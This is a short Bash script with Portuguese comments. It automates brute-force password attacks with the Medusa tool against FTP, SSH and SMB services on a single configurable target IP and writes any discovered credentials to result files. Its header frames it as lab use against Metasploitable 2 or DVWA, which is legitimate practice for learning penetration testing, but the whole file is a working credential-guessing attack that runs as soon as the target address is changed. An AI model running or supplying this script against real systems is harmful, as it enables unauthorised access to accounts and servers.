#!/bin/bash
# =============================================================================
#  brute_force.sh — Automação de ataques de força bruta com Medusa
#  Uso educacional em laboratório controlado e autorizado (Metasploitable 2 / DVWA).
#  Projeto: wordlists_medusa
# =============================================================================

# ---- Configuração (ajuste para o seu ambiente) ------------------------------
ALVO="192.168.56.101"          # IP da máquina alvo
USUARIOS="usuarios.txt"         # wordlist de usuários
SENHAS="senhas.txt"             # wordlist de senhas
THREADS=4                       # nº de threads (4 é seguro p/ SSH/FTP)

# ---- Cores (apenas estética) ------------------------------------------------
VERDE="\e[32m"; AMARELO="\e[33m"; RESET="\e[0m"

banner() { echo -e "\n${AMARELO}==> $1${RESET}"; }

# ---- Verificações básicas ---------------------------------------------------
command -v medusa >/dev/null 2>&1 || { echo "Medusa não encontrado. Instale com: sudo apt install medusa"; exit 1; }
[ -f "$USUARIOS" ] || { echo "Arquivo $USUARIOS não encontrado."; exit 1; }
[ -f "$SENHAS" ]   || { echo "Arquivo $SENHAS não encontrado."; exit 1; }

echo -e "${VERDE}Alvo: $ALVO | Usuários: $USUARIOS | Senhas: $SENHAS | Threads: $THREADS${RESET}"

# ---- FTP (porta 21) ---------------------------------------------------------
banner "Brute force em FTP (21)"
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M ftp -f -t "$THREADS" -O resultado_ftp.txt

# ---- SSH (porta 22) ---------------------------------------------------------
banner "Brute force em SSH (22)"
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M ssh -f -t "$THREADS" -O resultado_ssh.txt

# ---- SMB (portas 139/445) ---------------------------------------------------
banner "Brute force em SMB (139/445)"
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M smbnt -f -O resultado_smb.txt

echo -e "\n${VERDE}Concluído. Verifique os arquivos resultado_*.txt para as credenciais encontradas.${RESET}"
